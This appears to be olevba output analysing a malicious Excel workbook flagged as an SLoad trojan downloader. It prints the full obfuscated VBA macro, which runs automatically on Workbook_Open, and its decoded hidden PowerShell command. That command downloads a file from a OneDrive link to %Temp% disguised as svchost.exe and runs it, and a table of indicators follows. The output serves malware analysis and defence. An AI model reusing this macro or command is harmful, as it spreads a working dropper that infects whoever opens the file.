olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-e02e2804d98658cc76ef89c09f52f66843e68cb94f7578f1ff856aa4999a3c19
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
Loader"aHR0cDovL29uZWRyaXZlLmxpdmUuY29tL2Rvd25sb2FkP2NpZD0xODU3OTk1M0YyNDNEOTc5JnJlc2lkPTE4NTc5OTUzRjI0M0Q5NzklMjExMjYmYXV0aGtleT1BSXVQMHgteTE3dldZd1U="
End Sub
Function SySteM7A0OpK12VCGhAPlMN76GDHHBCHrw4PNbv_TGSFQPAL(str As String) As Variant: Dim bytes() As Byte: bytes = str: SySteM7A0OpK12VCGhAPlMN76GDHHBCHrw4PNbv_TGSFQPAL = bytes: End Function
Function ZCXVPOlPLokT5498ADSQEWp0OMCBhg_Olap6HG(bytes() As Byte) As String: Dim str As String: str = bytes: ZCXVPOlPLokT5498ADSQEWp0OMCBhg_Olap6HG = str: End Function

Function BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV(str As String) As String
    Const PLAO980ARQDXVQWRAEDS_DB As String = "qg1qysdvvxlj366df"
    Dim ZAGSFPLOKYHSGRETBg56tsref_BBA() As Byte, SokNAH_() As Byte
    ZAGSFPLOKYHSGRETBg56tsref_BBA = SySteM7A0OpK12VCGhAPlMN76GDHHBCHrw4PNbv_TGSFQPAL(str)
    CVFBy678IolPXVFSC12VbX_VCBN = SySteM7A0OpK12VCGhAPlMN76GDHHBCHrw4PNbv_TGSFQPAL(PLAO980ARQDXVQWRAEDS_DB)
    
    Dim COCOBCV0934VCBcxvTT50opaOO0C As Long
    COCOBCV0934VCBcxvTT50opaOO0C = UBound(ZAGSFPLOKYHSGRETBg56tsref_BBA)
    
    ReDim KoSoVoBPo_(0 To COCOBCV0934VCBcxvTT50opaOO0C) As Byte
    
    Dim idx As Long
    
    For idx = LBound(ZAGSFPLOKYHSGRETBg56tsref_BBA) To COCOBCV0934VCBcxvTT50opaOO0C:
        If Not ZAGSFPLOKYHSGRETBg56tsref_BBA(idx) = 0 Then
            c = ZAGSFPLOKYHSGRETBg56tsref_BBA(idx)
            For i = 0 To UBound(CVFBy678IolPXVFSC12VbX_VCBN):
                c = c Xor CVFBy678IolPXVFSC12VbX_VCBN(i)
            Next i
            KoSoVoBPo_(idx) = c
        End If
    
    Next idx
    
    BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV = ZCXVPOlPLokT5498ADSQEWp0OMCBhg_Olap6HG(KoSoVoBPo_)
End Function


Public Sub Loader(Link As String)

CreateObject(Aplo90VXcAzQQ2ERvcbMNploG690FXDCs5DGPWRE_PPC("57 53 63 72 69 70 74 2E 53 68 65 6C 6C")).Run (Base64Decode("cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBieXBhc3MgLVcgSGlkZGVuIC1jb21tYW5kIChuZXctb2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJw==" & Link & "JywkZW52OlRlbXArJ1xzdmNob3N0LmV4ZScpOyhOZXctT2JqZWN0IC1jb20gU2hlbGwuQXBwbGljYXRpb24pLlNoZWxsRXhlY3V0ZSgkZW52OlRlbXArJ1xzdmNob3N0LmV4ZScp"))


End Sub
Public Function Aplo90VXcAzQQ2ERvcbMNploG690FXDCs5DGPWRE_PPC(ByVal WQEAds908766VCQRETPlmBBvCXv0PlZCXBTreFGSTO88867FXVSF_XX As String) As String
Dim ADZpo985TFSRd8trsRReVXCvMNZ As String
Dim PAloBCv56XCzBVghAREq89Nm As String
Dim rno5s33dvhaypouve As Long
    For PLxvGGNbYTASDZp90FGXWqZAmLLPFXGo89CX = 1 To Len(WQEAds908766VCQRETPlmBBvCXv0PlZCXBTreFGSTO88867FXVSF_XX) Step 3
        wSyzXMLHWUSHvLYkKMMXYQvilaCUFhOtEcxHOMzjKQAtRrAJPgqiIRa = chr$(Val(BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV(chr(81) & "?" & "") & Mid$(WQEAds908766VCQRETPlmBBvCXv0PlZCXBTreFGSTO88867FXVSF_XX, PLxvGGNbYTASDZp90FGXWqZAmLLPFXGo89CX, 2)))
        ygovl6cr2igluj12f = ygovl6cr2igluj12f & wSyzXMLHWUSHvLYkKMMXYQvilaCUFhOtEcxHOMzjKQAtRrAJPgqiIRa
    Next PLxvGGNbYTASDZp90FGXWqZAmLLPFXGo89CX
    Aplo90VXcAzQQ2ERvcbMNploG690FXDCs5DGPWRE_PPC = ygovl6cr2igluj12f
End Function

Function Base64Decode(ByVal base64String)
  
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV(chr(87)), "")
  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV("5" & "" & "" & "" & "" & "" & chr(18) & "" & chr(65) & "" & "C" & "" & chr(51) & chr(18) & "" & chr(20) & chr(24) & "" & chr(19) & chr(18)), BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV(chr(53) & "" & chr(22) & chr(19) & "" & "W" & "" & chr(53) & "" & chr(22) & "" & chr(4) & "" & "" & "" & "A" & "" & "C" & "W" & "" & chr(4) & chr(3) & "" & "
" & "" & "" & "" & "" & chr(89))
    Exit Function
  End If
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3
      
      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV(chr(74)) Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV("5" & "" & "" & "" & "" & "" & chr(18) & "" & chr(65) & "" & "C" & "" & chr(51) & chr(18) & "" & chr(20) & chr(24) & "" & chr(19) & chr(18)), BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV("5" & chr(22) & chr(19) & chr(87) & "" & chr(20) & "" & "" & "" & "" & "" & chr(5) & "" & "" & "" & "" & "" & chr(3) & "" & "" & chr(87) & "" & chr(62) & "" & "W" & "" & "5" & "" & "" & "" & "" & chr(65) & "C" & "" & chr(87) & "" & "" & "" & "" & "" & "
" & "" & "" & "" & "" & chr(89) & "")
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next
    
   
    nGroup = Hex(nGroup)
    
    
    nGroup = String(6 - Len(nGroup), BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV(chr(71))) & nGroup
    
    
    pOut = chr(CByte(BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV(chr(81) & "?" & "") & Mid(nGroup, 1, 2))) + _
      chr(CByte(BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV(chr(81) & "?" & "") & Mid(nGroup, 3, 2))) + _
      chr(CByte(BvcXCvIoPAFSMLpoBCVPZASGDFIUYQWRAEDS_CV(chr(81) & "?" & "") & Mid(nGroup, 5, 2)))
    
   
    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function
-------------------------------------------------------------------------------
VBA MACRO Sheet 1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command (obfuscation: Base64)                |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command (obfuscation: Base64)                |
|Suspicious|powershell          |May run PowerShell commands (obfuscation:    |
|          |                    |Base64)                                      |
|Suspicious|executionpolicy     |May run PowerShell commands (obfuscation:    |
|          |                    |Base64)                                      |
|Suspicious|command             |May run PowerShell commands (obfuscation:    |
|          |                    |Base64)                                      |
|Suspicious|new-object          |May create an OLE object using PowerShell    |
|          |                    |(obfuscation: Base64)                        |
|Suspicious|Shell.Application   |May run an application (if combined with     |
|          |                    |CreateObject) (obfuscation: Base64)          |
|Suspicious|Net.WebClient       |May download files from the Internet using   |
|          |                    |PowerShell (obfuscation: Base64)             |
|Suspicious|DownloadFile        |May download files from the Internet using   |
|          |                    |PowerShell (obfuscation: Base64)             |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib) (obfuscation: Base64)            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://onedrive.live|URL (obfuscation: Base64)                    |
|          |.com/download?cid=18|                                             |
|          |579953F243D979&resid|                                             |
|          |=18579953F243D979%21|                                             |
|          |126&authkey=AIuP0x-y|                                             |
|          |17vWYwU             |                                             |
|IOC       |powershell.exe      |Executable file name (obfuscation: Base64)   |
|IOC       |svchost.exe         |Executable file name (obfuscation: Base64)   |
|Base64    |http://onedrive.live|aHR0cDovL29uZWRyaXZlLmxpdmUuY29tL2Rvd25sb2FkP|
|String    |.com/download?cid=18|2NpZD0xODU3OTk1M0YyNDNEOTc5JnJlc2lkPTE4NTc5OT|
|          |579953F243D979&resid|UzRjI0M0Q5NzklMjExMjYmYXV0aGtleT1BSXVQMHgteTE|
|          |=18579953F243D979%21|3dldZd1U=                                    |
|          |126&authkey=AIuP0x-y|                                             |
|          |17vWYwU             |                                             |
|Base64    |powershell.exe      |cG93ZXJzaGVsbC5leGUgLWV4ZWN1dGlvbnBvbGljeSBie|
|String    |-executionpolicy    |XBhc3MgLVcgSGlkZGVuIC1jb21tYW5kIChuZXctb2JqZW|
|          |bypass -W Hidden    |N0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZ|
|          |-command (new-object|pbGUoJw==                                    |
|          |System.Net.WebClient|                                             |
|          |).DownloadFile('    |                                             |
|Base64    |',$env:Temp+'\svchos|JywkZW52OlRlbXArJ1xzdmNob3N0LmV4ZScpOyhOZXctT|
|String    |t.exe');(New-Object |2JqZWN0IC1jb20gU2hlbGwuQXBwbGljYXRpb24pLlNoZW|
|          |-com Shell.Applicati|xsRXhlY3V0ZSgkZW52OlRlbXArJ1xzdmNob3N0LmV4ZSc|
|          |on).ShellExecute($en|p                                            |
|          |v:Temp+'\svchost.exe|                                             |
|          |')                  |                                             |
+----------+--------------------+---------------------------------------------+

